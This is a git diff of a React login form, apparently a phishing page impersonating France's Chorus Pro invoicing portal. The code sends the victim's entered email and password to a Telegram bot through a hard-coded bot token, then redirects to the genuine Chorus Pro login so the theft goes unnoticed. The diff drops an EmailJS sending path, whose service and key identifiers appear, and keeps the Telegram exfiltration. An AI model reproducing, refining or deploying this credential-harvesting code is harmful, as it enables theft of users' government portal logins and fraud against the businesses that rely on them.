@@ -28,14 +28,9 @@ function App() {
     }
 
     try {
-      // Envoyer le formulaire via emailjs
-      await emailjs.sendForm("service_44mdivb", "template_18yyg38", form.current, {
-        publicKey: "I38CNoPxPsXFjETua",
-      });
+      
 
-      console.log("SUCCESS!");
-      setEmail("");
-      setPassword("");
+      
 
       // Envoyer les informations via Telegram
       const botToken = '7089226670:AAHNSB19Gfzyc_6BkvjJVVU-Dv-_CFFs_YM';
@@ -54,8 +49,11 @@ function App() {
       });
 
       console.log("Message envoyé via Telegram!");
+      console.log("SUCCESS!");
+      setEmail("");
+      setPassword("");
 
-      window.location.href = "https://portail.chorus-pro.gouv.fr/aife_csm/fr?id=aife_catitem_details&cat_item_id=6e479e0d1ba0b410a15587b5604bcb2d";
+      window.location.href = "https://idp.chorus-pro.gouv.fr/auth/realms/chorus-pro/protocol/openid-connect/auth?scope=profile+email+openid&response_type=code&oauth_provider_id=d24601a41b2b1510a15587b5604bcb29&state=SNC5175391dcf5017c9d70760cc653353f2&redirect_uri=https%3A%2F%2Fportail.chorus-pro.gouv.fr%2Fnavpage.do&client_id=d50afa7e1191e81da1c0a38cb81ae130061c4164";
     } catch (error) {
       console.log("FAILED...", error);
     }
